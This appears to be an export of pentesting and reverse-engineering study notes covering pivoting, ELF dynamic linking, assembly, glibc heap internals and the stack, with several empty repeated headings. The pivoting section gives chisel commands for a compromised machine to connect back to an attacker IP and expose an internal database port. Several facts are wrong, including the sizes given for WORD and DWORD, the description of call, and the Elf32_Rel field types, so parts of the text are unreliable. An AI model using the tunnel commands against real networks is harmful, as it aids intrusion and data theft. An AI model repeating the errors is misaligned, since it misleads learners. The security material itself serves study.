<p>https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters/powerview</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-15"><a class="header" href="#introduction-15">Introduction</a></h1>
<p>Pivoting is the act of establishing access to internal resources on a network through a compromised machine. This allows an adversary to exifltrate local data which is usually not accessible from the outside world. Moreover, it permits the use of hacking tools as if they were running from inside the network.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-16"><a class="header" href="#introduction-16">Introduction</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-17"><a class="header" href="#introduction-17">Introduction</a></h1>
<p>Chisel is an open-source application for port tunneling. You can get it from https://github.com/jpillora/chisel. Clone the repo and follow the installation instructions.</p>
<p>In order to port tunnel with chisel, you need to have a copy of the binary on both the attacking and the compromised machines.</p>
<h1 id="creating-a-reverse-tunnel"><a class="header" href="#creating-a-reverse-tunnel">Creating a reverse tunnel</a></h1>
<p>Run the following command on the attacking machine:</p>
<pre><code class="language-bash">chisel server -p [Listen Port] --reverse &amp;
</code></pre>
<p>This will setup a chisel server on <code>Listen Port</code>.</p>
<p>On the compromised systenm run:</p>
<pre><code class="language-bash">chisel client [Attacker IP]:[Listen Port] R:[Local Host]:[Local Port]:[Remote Host]:[Remote Port] &amp;
</code></pre>
<p>This will endeavour to connect to a chisel server at the specified <code>Attacker IP</code> and <code>Listen Port</code>. Once it has connected to the remote chisel server, the chisel server will open <code>Remote Port</code> on the <code>Remote Host</code> and tunnel it to the <code>Local Port</code> of <code>Local Host</code>. From now on, any traffic sent to <code>Remote Port</code> on the <code>Remote Host</code> will be forwarded to the <code>Local Port</code> of <code>Local Host</code>. </p>
<p>Chisel also defines some defaults for these values, which means you can omit some of them:</p>
<p><code>Local Host</code> - 0.0.0.0
<code>Remote Host</code> - 0.0.0.0 (server localhost)</p>
<p>As an example, suppose you start a chisel server on your attacking machine (10.10.10.189) on port 1337, and want to gain access to port 3306 on the compromised machine. On the attacking machine you run:</p>
<pre><code class="language-bash">chisel server -p 1337 --reverse &amp;
</code></pre>
<p>On the compromised system you will run:</p>
<pre><code class="language-bash">chisel client 10.10.10.189:1337 R:localhost:3306:localhost:31337 &amp;
</code></pre>
<p>The above basically translates to &quot;Forward any traffic intended for port 31337 localhost on my attacking machine to port 3306 on the localhost of the compromised system&quot;.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="reverse-engineering"><a class="header" href="#reverse-engineering">Reverse Engineering</a></h1>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-18"><a class="header" href="#introduction-18">Introduction</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-19"><a class="header" href="#introduction-19">Introduction</a></h1>
<p>Dynamic linking permits the loading of libraries at runtime, which avoids their incorporation into the executable at compile time and, consequently, saves a drastic amount of disk space at the cost of significantly complicating the linking process. The dynamic linker has to go through the instructions and fix any calls to external functions after the required libraries have been mapped into the running executable. Additionally, the default behaviour is the so-called lazy loading - function addresses aren’t even resolved until the first time a procedure is invoked (although this can be overridden when compiling the executable).</p>
<p>When a function from a dynamic library is called, the call instruction always jumps to somewhere in the executable section of the ELF file called the Procedure Linking Table (PLT). All entries in this table are of a fixed length and each corresponds to a particular function. The initial element (PLT0) is a bit different in that it contains two instructions - the first one pushes the address of the link map (a structure containing a list of the shared libraries referenced by the executable) to the stack and the second instruction jumps to <code>_dl_resolve</code>, which takes two parameters - the link map and a relocation argument.</p>
<p><img src="Reverse%20Engineering/Binary%20Formats/ELF/Resources/Images/PLT0.png" alt="" /></p>
<p>When a PLT entry, other than the first one, is executed, the programme first jumps to the address contained in the corresponding part of the Global Offset Table (GOT). When the function hasn’t been called before, this address will point to the next instruction in the respective PLT entry - in the case of <code>memcpy</code> this is the instruction at address 1036. This instruction pushes the offset from the beginning of the relocation table at which relocation information about this particular symbol is located. This is also the relocation argument we mentioned earlier. If the procedure has been previously invoked, its address will already be stored in the corresponding GOT entry and so the first instruction in the PLT entry will directly jump to the function at hand. The last instruction of every function’s PLT section just hands off execution to PLT0.</p>
<h1 id="the-relocation-table"><a class="header" href="#the-relocation-table">The Relocation Table</a></h1>
<p>The relocation table contains symbol relocation information in the form of an array of either <code>Elf32_Rel</code> or <code>Elf32_Rela</code> structures (for x32) and <code>Elf64_Rel</code> or <code>Elf64_Rela</code> (for x64). These are defined as follows:</p>
<pre><code class="language-cpp">typedef struct {
        Elf32_Addr      r_offset;
        Elf32_Xword     r_info;
} Elf32_Rel;
 
typedef struct {
        Elf32_Addr      r_offset;
        Elf32_Xword     r_info;
        Elf32_Sxword    r_addend;
} Elf32_Rela;

typedef struct {
        Elf64_Addr      r_offset;
        Elf64_Xword     r_info;
} Elf64_Rel;
 
typedef struct {
        Elf64_Addr      r_offset;
        Elf64_Xword     r_info;
        Elf64_Sxword    r_addend;
} Elf64_Rela;

</code></pre>
<h1 id="the-dynamic-symbol-table"><a class="header" href="#the-dynamic-symbol-table">The Dynamic Symbol Table</a></h1>
<p>The dynamic symbol table (<code>.dynsym</code>) is an array of <code>Elf32_Sym</code> or <code>Elf64_Sym</code> structures (for x32 and x64, respectively) which are comprised of the following:</p>
<pre><code class="language-cpp">typedef struct {
		Elf32_Word      st_name;
        Elf32_Addr      st_value;
        Elf32_Word      st_size;
        unsigned char   st_info;
        unsigned char   st_other;
        Elf32_Half      st_shndx;
} Elf32_Sym;

typedef struct {
        Elf64_Word      st_name;
        unsigned char   st_info;
        unsigned char   st_other;
        Elf64_Half      st_shndx;
        Elf64_Addr      st_value;
        Elf64_Xword     st_size;
} Elf64_Sym;
</code></pre>
<h1 id="_dl_resolve"><a class="header" href="#_dl_resolve"><code>_dl_resolve</code></a></h1>
<p>When PLT0 hands off execution to <code>_dl_resolve</code>, the function will be called with the link map (pushed on the stack by PLT0) and the relocation argument (<code>reloc_arg</code>) which was pushed onto the stack by the respective PLT entry. You will notice that <code>_dl_resolve</code> takes its arguments directly from the stack. This is because once <code>_dl_resolve</code> finds the address of the requested symbol, it will invoke the procedure in addition to placing its address in the GOT. This means that we can still use the registers in order to provide arguments to the requested function.</p>
<h2 id="how-_dl_resolve-works"><a class="header" href="#how-_dl_resolve-works">How <code>_dl_resolve</code> works</a></h2>
<p><code>_dl_resolve</code> on its own is a simple wrapper around several other functions. Initially, the relocation argument is used in order to locate the appropriate entry in the relocation table of the executable. The <code>r_info</code> member of this entry is then used to find the corresponding element in the dynamic symbol table. From there, <code>st_name</code> is utilised to pinpoint the location of the name of the function in the string table. Subsequently, <code>_dl_resolve</code> avails itself of this string in order to look it up in the code of the library. Once the address is found, <code>r_offset</code> is used to locate where in the GOT the address should be placed (note that despite its use, <code>r_offset</code> is actually an offset from the beginning of the ELF header). The function initially invoked is also called with any arguments which were provided to it. It bears a resemblance to the following:</p>
<p><img src="Reverse%20Engineering/Binary%20Formats/ELF/Resources/Images/_dl_resolve.png.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-20"><a class="header" href="#introduction-20">Introduction</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="program-anatomy"><a class="header" href="#program-anatomy">Program Anatomy</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="instructions"><a class="header" href="#instructions">Instructions</a></h1>
<p>Each program is comprised of a set of instructions which tell the CPU what operations it needs to perform. Different CPU architectures make use of different instruction sets, however, all of them boil down to two things - an opertation code (opcode) and optional data that the instruction operates with. These are all represented using bits - 1s and 0s.</p>
<h3 id="mov"><a class="header" href="#mov"><code>mov</code></a></h3>
<p>Moves the value inside one register to another:</p>
<pre><code>mov rax, rdx
</code></pre>
<h3 id="lea"><a class="header" href="#lea"><code>lea</code></a></h3>
<p>Load effective address - this instruction calculates the address of its second operand and moves it into its first operand:</p>
<pre><code>lea rdx, [rax+0x10]
</code></pre>
<p>This will move <code>rax+0x10</code> inside <code>rdx</code>.</p>
<h3 id="add"><a class="header" href="#add"><code>add</code></a></h3>
<p>This instruction adds its operands and stores the result in its first operand:</p>
<pre><code>add rax, rdx
</code></pre>
<h3 id="sub"><a class="header" href="#sub"><code>sub</code></a></h3>
<p>This instruction subtracts the second operand from the first and stores the result in its first operand</p>
<pre><code>sub rax, 0x9
</code></pre>
<h3 id="xor"><a class="header" href="#xor"><code>xor</code></a></h3>
<p>It performs XOR-ing on its operands and stores the results into the first operand:</p>
<pre><code>xor rdx, rax
</code></pre>
<p>The <code>and</code> and <code>or</code> are the same, but instead perform a binary <code>AND</code> and a binary <code>OR</code> operation, respectively.</p>
<h3 id="push"><a class="header" href="#push"><code>push</code></a></h3>
<p>Decreases the stack pointer (grows the stack) by 8 (4 on x86) bytes and stores the contents of its operand on the stack:</p>
<pre><code>push rax
</code></pre>
<h3 id="pop"><a class="header" href="#pop"><code>pop</code></a></h3>
<p>Increases the stack pointer (shrinks the stack) by 8 (4 on x86) bytes and stores the popped value from the stack into its operand:</p>
<pre><code>pop rax
</code></pre>
<h3 id="jmp"><a class="header" href="#jmp"><code>jmp</code></a></h3>
<p>Jumps to the address specified - used for redirecting code execution:</p>
<pre><code>jmp 0x6A2B10
</code></pre>
<h3 id="call"><a class="header" href="#call"><code>call</code></a></h3>
<p>Used for invoking procedures. It first pushes the values of the base and stack pointers onto the stack and then jumps to the specified address. After the function is finished, a <code>ret</code> instruction is issued which restores the values of the stack and base pointers from the stack and continues execution from where it left off.</p>
<h3 id="cmp"><a class="header" href="#cmp"><code>cmp</code></a></h3>
<p>It compares the value of its two operands and sets the according flags depending on the result:</p>
<pre><code>cmp rax, rdx
</code></pre>
<p>If <code>rax</code> &lt; <code>rdx</code>, the zero flag is set to 0 and the carry flag is set to 1.</p>
<p>If <code>rax</code> &gt; <code>rdx</code>, the zero flag is set to 0 and the carry flag is set to 0.</p>
<p>If <code>rax</code> = <code>rdx</code>, the zero flag is set to 1 and the carry flag is set to 0.</p>
<h3 id="jz--jnz"><a class="header" href="#jz--jnz"><code>jz</code> / <code>jnz</code></a></h3>
<p><code>jump-if-zero</code> and <code>jump-if-not-zero</code> execute depending on the state of the zero flag.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="registers"><a class="header" href="#registers">Registers</a></h1>
<p>Registers are value containers which reside on the CPU and not in RAM. They are small in size and some have special purposes. You may store both addresses and values in registers and depending on the instruction used the data inside will be interpreted in a different way - this is commonly called an <em>addressing mode</em>.</p>
<p>In x86 Intel assembly (i386), the registers are 32 bits (4 bytes) in size and some of them are reserved:</p>
<p><code>ebp</code> - the base pointer, points to the bottom of the current stack frame</p>
<p><code>esp</code> - the stack pointer, points to the top of the current stack frame</p>
<p><code>eip</code> - the instruction pointer, points to the next instruction to be executed</p>
<p>The other registers are general purpose registers and can be used for anything you like:
<code>eax</code>, <code>ebx</code>, <code>ecx</code>, <code>edx</code>, <code>esi</code>, <code>edi</code>.</p>
<p>x64 AMD assembly (amd64) extends these 32-bit registers to 64-bit ones and denotes these new versions by replacing the initial <code>e</code> with an <code>r</code>: <code>rbp</code>, <code>rsp</code>, <code>rip</code>, <code>rax</code>, ... It is important to note that these are <em>not</em> different registers - <code>eax</code> and <code>rax</code> refer to the same space on the CPU, however, <code>eax</code> only provides access to the lower 32 bits of the 64-bit register. You can also get access to the lower 16 and 8 bits of the register using different names:</p>
<table><thead><tr><th style="text-align: center">8 Byte Register</th><th style="text-align: center">Lower 4 Bytes</th><th style="text-align: center">Lower 2 Bytes</th><th style="text-align: center">Lower Byte</th></tr></thead><tbody>
<tr><td style="text-align: center">rbp</td><td style="text-align: center">ebp</td><td style="text-align: center">bp</td><td style="text-align: center">bpl</td></tr>
<tr><td style="text-align: center">rsp</td><td style="text-align: center">esp</td><td style="text-align: center">sp</td><td style="text-align: center">spl</td></tr>
<tr><td style="text-align: center">rip</td><td style="text-align: center">eip</td><td style="text-align: center"></td><td style="text-align: center"></td></tr>
<tr><td style="text-align: center">rax</td><td style="text-align: center">eax</td><td style="text-align: center">ax</td><td style="text-align: center">al</td></tr>
<tr><td style="text-align: center">rbx</td><td style="text-align: center">ebx</td><td style="text-align: center">bx</td><td style="text-align: center">bl</td></tr>
<tr><td style="text-align: center">rcx</td><td style="text-align: center">ecx</td><td style="text-align: center">cx</td><td style="text-align: center">cl</td></tr>
<tr><td style="text-align: center">rdx</td><td style="text-align: center">edx</td><td style="text-align: center">dx</td><td style="text-align: center">dl</td></tr>
<tr><td style="text-align: center">rsi</td><td style="text-align: center">esi</td><td style="text-align: center">si</td><td style="text-align: center">sil</td></tr>
<tr><td style="text-align: center">rdi</td><td style="text-align: center">edi</td><td style="text-align: center">di</td><td style="text-align: center">dil</td></tr>
<tr><td style="text-align: center">r8</td><td style="text-align: center">r8d</td><td style="text-align: center">r8w</td><td style="text-align: center">r8b</td></tr>
<tr><td style="text-align: center">r9</td><td style="text-align: center">r9d</td><td style="text-align: center">r9w</td><td style="text-align: center">r9b</td></tr>
<tr><td style="text-align: center">r10</td><td style="text-align: center">r10d</td><td style="text-align: center">r10w</td><td style="text-align: center">r10b</td></tr>
<tr><td style="text-align: center">r11</td><td style="text-align: center">r11d</td><td style="text-align: center">r11w</td><td style="text-align: center">r11b</td></tr>
<tr><td style="text-align: center">r12</td><td style="text-align: center">r12d</td><td style="text-align: center">r12w</td><td style="text-align: center">r12b</td></tr>
<tr><td style="text-align: center">r13</td><td style="text-align: center">r13d</td><td style="text-align: center">r13w</td><td style="text-align: center">r13b</td></tr>
<tr><td style="text-align: center">r14</td><td style="text-align: center">r14d</td><td style="text-align: center">r14w</td><td style="text-align: center">r14b</td></tr>
<tr><td style="text-align: center">r15</td><td style="text-align: center">r15d</td><td style="text-align: center">r15w</td><td style="text-align: center">r15b</td></tr>
</tbody></table>
<p>Each row contains names which refer to different parts of the <em>same</em> register. Note, you cannot access the lower 16 or 8 bits of the instruction pointer.</p>
<p>You might sometimes see <code>WORD</code> or <code>DWORD</code> being used in a similar context - <code>WORD</code> means 4 bytes and <code>DWORD</code> means 8 bytes.</p>
<h2 id="register-use-in-x64-linux"><a class="header" href="#register-use-in-x64-linux">Register Use in x64 Linux</a></h2>
<p>Under x64 Linux, function arguments are passed via registers:</p>
<pre><code>rdi:    First Argument
rsi:    Second Argument
rdx:    Third Argument
rcx:    Fourth Argument
r8:     Fifth Argument
r9:     Sixth Argument
</code></pre>
<p>The return value is store in <code>rax</code> (<code>eax</code> on 32-bit machines).</p>
<h2 id="register-dereferencing"><a class="header" href="#register-dereferencing">Register Dereferencing</a></h2>
<p>Register dereferencing occurs when the value of the register is treated as an address to the actual data to be used, rather than the data itself. This means that addressed can be stored in registers and used later - this is useful when dealing with large data sizes.</p>
<p>For example,</p>
<pre><code>mov rax, [rdx]
</code></pre>
<p>Will check the value inside <code>rdx</code> and treat it as an address - it will go to the location where this address points and get its data from there. It will then move this data into <code>rax</code>. If we hadn't used <code>[]</code>, it would have treated the address in <code>rdx</code> simply as a value and moved it directly into <code>rax</code>.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="the-heap"><a class="header" href="#the-heap">The Heap</a></h1>
<p>The heap is a memory region which allows for dynamic allocation. Memory on the heap is alloted at runtime and programs are permitted to freely request additional heap memory whenever it is required.</p>
<p>It is the program's job to request and relieve any heap memory <em>only once</em>. Failure to do so can result in undefined behaviour. In C, heap memory is usually allocated through the use of <code>malloc</code> and whenever the program is finished with this data, the <code>free</code> function must be envoked in order to mark the area as available for use by the operating system and/or other programs.</p>
<p>Heap memory can also be allocated by using malloc-compatible heap functions like <code>calloc</code>, <code>realloc</code> and <code>memalign</code> or in C++ using the corresponding <code>new</code> and <code>new[]</code> operators as well as their deallocation counterparts <code>delete</code> and <code>delete[]</code>.</p>
<h2 id="heap-rules"><a class="header" href="#heap-rules">Heap Rules</a></h2>
<ol>
<li><em>Do not</em> read or write to a pointer returned by <code>malloc</code> after that pointer has been passed to <code>free</code>. -&gt; Can lead to use after free vulnerabilities. </li>
<li><em>Do not</em> use or leak uninitialised information in a heap allocation. -&gt; Can lead to information leaks or uninitialised data vulnerabilities.</li>
<li><em>Do not</em> read or write bytes after the end of an allocation. -&gt; Can lead to heap overflow and read beyond bounds vulnerabilities.</li>
<li><em>Do not</em> pass a pointer that originated from <code>malloc</code> to <code>free</code> more than once. -&gt; Can lead to double delete vulnerabilities.</li>
<li><em>Do not</em> write bytes before the beginning of the allocation. -&gt; Can lead to heap underflow vulnerabilities.</li>
<li><em>Do not</em> pass a pointer that did not originate from <code>malloc</code> to <code>free</code>.  -&gt; Can lead to invalid free vulnerabilities.</li>
<li><em>Do not</em> use a pointer returned by <code>malloc</code> before checking if the function returned <code>NULL</code>. -&gt; Can lead to null-dereference bugs and sometimes arbitrary write vulnerabilities.</li>
</ol>
<p>The implementation of the heap is platform specific.</p>
<h1 id="the-glibc-heap"><a class="header" href="#the-glibc-heap">The GLIBC Heap</a></h1>
<p>The heap grows from lower to higher address. </p>
<h2 id="chunks"><a class="header" href="#chunks">Chunks</a></h2>
<p>The heap manager allocates resources in the so-called <em>chunks</em>. These chunks are stored adjacent to each other and must be 8-byte aligned or 16-byte aligned on 32-bit and 64-bit systems respectively. In addition to this padding, each chunks contains metadata which provides information about the chunk itself. Consequently, issuing a request for memory allocation on the heap actually allocates more bytes than originally requested.</p>
<p>It is important to distinguish between in-use chunks and free (or previously allocated) chunks, since they have disparate memory layouts.</p>
<p>The following diagram outlines a chunk that is in use:</p>
<p><img src="Reverse%20Engineering/Program%20Anatomy/Resources/Images/In_use_chunk.png" alt="" /></p>
<p>The <code>size</code> field contains the chunk size in bytes. The following three bits carry specific meaning:</p>
<ul>
<li><strong>A (0x04)</strong> - Allocated arena. If this bit is 0, the chunk comes from the main arena and the main heap. If this bit is 1, the chunk comes from mmap'd memory and the location of the heap can be computed from the chunk's address.</li>
<li><strong>M (0x02)</strong> - If this bit is set, then the chunk was <code>mmap</code>-ed and isn't part of a heap. Typically used for large allocations.</li>
<li><strong>P (0x01)</strong> - If this bit is set, then the previous chunk should not be considered for coalescing and the <code>mchunkptr</code> points to a previous chunk still in use</li>
</ul>
<p>A free chunk looks a bit different:</p>
<p><img src="Reverse%20Engineering/Program%20Anatomy/Resources/Images/Free_chunk.png" alt="" /></p>
<p>The size and AMP fields carry on the same meaning as those in chunks that are in use. Free chunks are organised in linked or doubly linked lists called <em>bins</em>. The <code>fwd</code> and <code>bck</code> pointers are utilised in the implementation of those linked lists. Different types of bins exist for different purposes.</p>
<p>The top of the heap is by convention called <em>the top chunk</em>.</p>
<h2 id="memory-allocation-on-the-heap"><a class="header" href="#memory-allocation-on-the-heap">Memory Allocation on the Heap</a></h2>
<h3 id="allocating-from-free-chunks"><a class="header" href="#allocating-from-free-chunks">Allocating from Free Chunks</a></h3>
<p>When an application requests heap memory, the heap manager traverses the bins in search of a free chunk that is large enough to service the request. If such a chunk is found, it is removed from the bin, turned into an in-use chunk and then a pointer is returned to the user data section of the chunk.</p>
<h3 id="allocating-from-the-top-chunk"><a class="header" href="#allocating-from-the-top-chunk">Allocating from the Top Chunk</a></h3>
<p>If no free chunk is found that can service the request, the heap manager must construct an entirely new chunk at the top of heap. To achieve this, it first needs to ascertain whether there is enough space at the top of the heap to hold the new chunk.</p>
<h3 id="requesting-additional-memory-at-the-top-of-the-heap-from-the-kernel"><a class="header" href="#requesting-additional-memory-at-the-top-of-the-heap-from-the-kernel">Requesting Additional Memory at the Top of the Heap from the Kernel</a></h3>
<p>Once the free space at the top of the heap is used up, the heap manager will have to ask the kernel for additional memory.</p>
<p>On the initial heap, the heap manager asks the kernel to allocate more memory at the end of the heap by calling <code>sbrk</code>.On most Linux-based systems this function internally uses a system call called <code>brk</code>. </p>
<p>Eventuall, the heap will grow to its maximum size, since expanding it any further would cause it to intrude on other sections of the process' address space. In this case, the heap manager will resort to using <code>mmap</code> to map new memory for heap expansions.</p>
<p>If <code>mmap</code> also fails, then the process is unable to allocate more memory and <code>malloc</code> returns <code>NULL</code>.</p>
<h3 id="allocating-large-chunks"><a class="header" href="#allocating-large-chunks">Allocating Large Chunks</a></h3>
<p>Large chunks get treated differently in their allocation. These are allocated off-heap through the direct use of <code>mmap</code> calls and this is reflected in the chunk's metadata by setting the <code>M</code> bit to 1. When such allocations are later returned to the heap manager via a call to <code>free</code>, the heap manager releases the entire <code>mmap</code>-ed region back to the system via <code>munmap</code>.</p>
<p>Different platforms have different default thresholds for what counts as a large chunk and what doesn't.</p>
<h2 id="arenas"><a class="header" href="#arenas">Arenas</a></h2>
<p>Multithreaded applications require that internal data structures on the heap are protected from race conditions. In the past, the heap manager availed itself of a global mutex before every heap operation, however, significant performance issues arised as a result. Consequently, the concept of &quot;arenas&quot; was introduced. </p>
<p>Each arena consists of a separate heap which manages its own chunk allocation and bins. Although each arena still utilises a mutex for its internal operations, different threads can make use of different arenas to avoid having to wait for each other. </p>
<p>The initial (main) arena consists of a single heap and for singlethreaded applications it is all there ever will exist. However, as more threads are spawned, new arenas are allocated and attached to them. Once all available arenas are being utilised by threads, the heap manager will commence creating new ones until a limit - <code>2 * Number of CPU cores</code> for 32-bit and <code>8 * Number of CPU cores</code> for 64-bit processes - is reached. Afterwards, multiple threads will be forced to share the same arena.</p>
<h2 id="bins"><a class="header" href="#bins">Bins</a></h2>
<p>Free chunks are organised in the so-called <em>bins</em> which are essentially linked lists. For performance reasons different types of bins exist. There are 62 <strong>small bins,</strong> 63 <strong>large bins,</strong> 1 <strong>unsorted bin,</strong> 10 <strong>fast bins</strong> and 64 <strong>tcache bins</strong> per thread. The last two appeared later and are built on top of the first three.</p>
<p>Pointers to the small, large, and unsorted bins are stored in the same array in the heap manager:</p>
<pre><code class="language-cpp">BIN[0] -&gt; invalid (unused)
BIN[1] -&gt; unsorted bin
BIN[2] to BIN[63] -&gt; small bins
BIN[64] to BIN[126] -&gt; large bins
</code></pre>
<h3 id="small-bins"><a class="header" href="#small-bins">Small Bins</a></h3>
<p>There are 62 small bins and each of them stores chunks of a fixed size. Each chunk with a size less than 512 bytes on 32-bit systems and 1024 bytes on 64-bit systems has a corresponding small bin. Small bins are sorted by default due to the fixed size of their elements and Insertion and removal of entries on these bins is incredibly fast.</p>
<p><img src="Reverse%20Engineering/Program%20Anatomy/Resources/Images/Small%20Bin.png" alt="" /></p>
<h3 id="large-bins"><a class="header" href="#large-bins">Large Bins</a></h3>
<p>There are 63 large bins and they resemble small bins in their operation but store chunks of different sizes. Consequently, insertions and removal of entries on these lists is slower, since the entire bin has to be traversed in order to find a suitable chunk. </p>
<p>There is a different number of bins allocated for specific chunk size ranges. The size of the chunk size range begins at 64 bytes - there are 32 bins all of which shift the range of chunk sizes they store by 64 from the previous bin. Following are 16 bins which shift the range by 512 bytes and so on.</p>
<p>In essence:</p>
<ul>
<li>Bin 1 -&gt; stores chunks of sizes 512 - 568 bytes;</li>
<li>Bin 2 -&gt; stores chunks of sizes 576 - 632 bytes;</li>
<li>...</li>
</ul>
<p>There are:</p>
<table><thead><tr><th style="text-align: center">Number of Bins</th><th style="text-align: center">Spacing between Bins</th></tr></thead><tbody>
<tr><td style="text-align: center">32</td><td style="text-align: center">64</td></tr>
<tr><td style="text-align: center">16</td><td style="text-align: center">512</td></tr>
<tr><td style="text-align: center">8</td><td style="text-align: center">4096</td></tr>
<tr><td style="text-align: center">4</td><td style="text-align: center">32768</td></tr>
<tr><td style="text-align: center">2</td><td style="text-align: center">262144</td></tr>
<tr><td style="text-align: center">1</td><td style="text-align: center">Remaining chunk sizes</td></tr>
</tbody></table>
<h3 id="unsorted-bins"><a class="header" href="#unsorted-bins">Unsorted Bins</a></h3>
<p>There is a single unsorted bin. Chunks from small and large bins end up directly in this bin after they are freed. The point of the unsorted bin is to speed up allocations by serving a sort of cache. When <code>malloc</code> is invoked, it will first traverse this bin and see if it can immediately service the request. If not, it will move onto the small or large bins respectively.</p>
<h3 id="fast-bins"><a class="header" href="#fast-bins">Fast Bins</a></h3>
<p>Fast bins provide a further optimisation layer. Recently released small chunks are put in fast bins and are not initially merged with their neighbours. This allows for them to be repurposed forthwith, should a <code>malloc</code> request for that chunk size come very soon after the chunk's release. There are 10 fast bins, covering chunks of size 16, 24, 32, 40, 48, 56, 64, 72, 80, and 88 bytes plus chunk metadata.</p>
<p>Fast bins are implemented as singly linked lists and insertions and removals of entries in them are really fast. Periodically, the heap manager <em>consolidates</em> the heap - chunks in the fast bins are merged with the abutting chunks and inserted into the unsorted bin.</p>
<p>This consolidation occurs when a <code>malloc</code> request is issued for a size that is larger than a fast bin can serve (chunks over 512 bytes on 32-bit systems and over 1024 bytes on 64-bit systems), when freeing a chunk larger than 64KB or when <code>malloc_trim</code> or <code>mallopt</code> is invoked.</p>
<h3 id="tcache-bins"><a class="header" href="#tcache-bins">TCache Bins</a></h3>
<p>A new caching mechanism called <em>tcache</em> (thread local caching) was introduced in glibc version 2.26 back in 2017. </p>
<p>The tcache stores bins of fixed size small chunks as singly linked lists. Similarly to a fast bin, chunks in tcache bins aren't merged with adjoining chunks. By default, there are 64 tcache bins, each containing a maximum of 7 same-sized chunks. The possible chunk sizes range from 12 to 516 bytes on 32-bit systems and from 24 to 1032 bytes on 64-bit systems.</p>
<p>When a chunk is freed, the heap manager checks if the chunk fits into a tcache bin corresponding to that chunk size. If the tcache bin for this size is full or the chunk is simply too big to fit into a tcache bin, the heap manager obtains a lock on the arena and proceeds to comb through other bins in order to find a suitable one for the chunk.</p>
<p>When <code>malloc</code> needs to service a request, it first checks the tcache for a chunk of the requested size that is available and should such a chunk be found, <code>malloc</code> will return it without ever having to obtain a lock. If the chunk too big, <code>malloc</code> continues as before.</p>
<p>A slightly different strategy is employed if the requested chunk size does have a corresponding tcache bin, but that bin is simply full. In that case, <code>malloc</code> obtains a lock and promotes as many heap chunks of the requested size to tcache chunks, up to the tcache bin limit of 7. Subsequently, the last matching chunk is returned.</p>
<h2 id="malloc-and-free"><a class="header" href="#malloc-and-free"><code>malloc</code> and <code>free</code></a></h2>
<h3 id="allocation"><a class="header" href="#allocation">Allocation</a></h3>
<p>First, every allocation exists as a memory chunk which is aligned and contains metadata as well as the region the programmer wants. When a programmer requests memory from the heap, the heap manager first works out what chunk size the allocation request corresponds to, and then searches for the memory in the following order:</p>
<ol>
<li>If the size corresponds with a <em>tcache</em> bin and there is a <code>tcache</code> chunk available, return that immediately.</li>
<li>If the request is huge, allocate a chunk off-heap via <code>mmap.</code></li>
<li>Otherwise obtain the arena heap lock and then perform the following steps, in order:
<ol>
<li><strong>Try the <em>fastbin/smallbin</em> recycling strategy</strong>
<ul>
<li>If a corresponding fast bin exists, try and find a chunk from there (and also opportunistically prefill the tcache with entries from the fast bin).</li>
<li>Otherwise, if a corresponding small bin exists, allocate from there (opportunistically prefilling the tcache as we go).</li>
</ul>
</li>
<li><strong>Resolve all the deferred frees</strong>
-   Otherwise merge the entries in the fast bins and move their consolidated chunks to the unsorted bin.
-   Go through each entry in the unsorted bin. If it is suitable, return it. Otherwise, put the unsorted entry on its corresponding small/large bin as we go (possibly promoting small entries to the tcache).</li>
<li><strong>Default back to the basic recycling strategy</strong>
<ul>
<li>If the chunk size corresponds with a large bin, search the corresponding large bin now.</li>
</ul>
</li>
<li><strong>Create a new chunk from scratch</strong>
<ul>
<li>Otherwise, there are no chunks available, so try and get a chunk from the top of the heap.</li>
<li>If the top of the heap is not big enough, extend it using <code>sbrk</code>.</li>
<li>If the top of the heap can’t be extended because we ran into something else in the address space, create a discontinuous extension using <code>mmap</code> and allocate from there</li>
</ul>
</li>
<li><strong>If all else fails, return <code>NULL</code>.</strong></li>
</ol>
</li>
</ol>
<h3 id="deallocation"><a class="header" href="#deallocation">Deallocation</a></h3>
<ol>
<li>If the pointer is <code>NULL</code>, do nothing.</li>
<li>Otherwise, convert the pointer back to a chunk by subtracting the size of the chunk metadata.</li>
<li>Perform a few sanity checks on the chunk, and abort if the sanity checks fail.</li>
<li>If the chunk fits into a tcache bin, store it there.</li>
<li>If the chunk has the <code>M</code> bit set, give it back to the operating system via <code>munmap</code>.</li>
<li>Otherwise we obtain the arena heap lock and then:
<ol>
<li>If the chunk fits into a fastbin, put it on the corresponding fastbin.</li>
<li>If the chunk size is greater than 64KB, consolidate the fastbins immediately and put the resulting merged chunks on the unsorted bin.</li>
<li>Merge the chunk backwards and forwards with neighboring freed chunks in the small, large, and unsorted bins.</li>
<li>If the resulting chunk lies at the top of the heap, merge it into the top chunk.</li>
<li>Otherwise store it in the <code>unsorted bin</code>. </li>
</ol>
</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="the-stack"><a class="header" href="#the-stack">The Stack</a></h1>
<p>The stack is a place in memory. It's a Last-In-First-Out (LIFO) data structure, meaning that the last element to be added will be the first to get removed. Each process has access to its own stack which isn't bigger than a few megabytes. Adding data to the stack is called <em>pushing</em> onto the stack, whilst removing data is called <em>popping</em> off the stack. Although the location of the added or removed data is fixed (it's always to or from the top of the stack), existing data can still be read or written to arbitrarily.</p>
<p>A special register is used for keeping track of the <em>top</em> of the stack - the stack pointer or <code>rsp</code>. When pushing data, the stack pointer <em>diminishes</em>, and when removing data, the stack pointer <em>augments</em>. This is because the stack grows from higher to lower memory addresses.</p>
<p><img src="Reverse%20Engineering/Program%20Anatomy/Resources/Images/TheStack.png" alt="" /></p>
<h1 id="stack-frames"><a class="header" href="#stack-frames">Stack Frames</a></h1>
<p>When a function is invoked, a <em>stack frame</em> is constructed. First, the function's arguments which do not fit into the registers are pushed on the stack, then the <em>return</em> address is also pushed. Following this, the value of a special register known as the <em>base pointer</em> (<code>rbp</code>) is saved onto the stack and the value inside the register is then updated to point to the location on the stack where we saved the base pointer.</p>
<p>From then on, the stack pointer is used for allocating local data inside the function and the base pointer is used for accessing this data.</p>
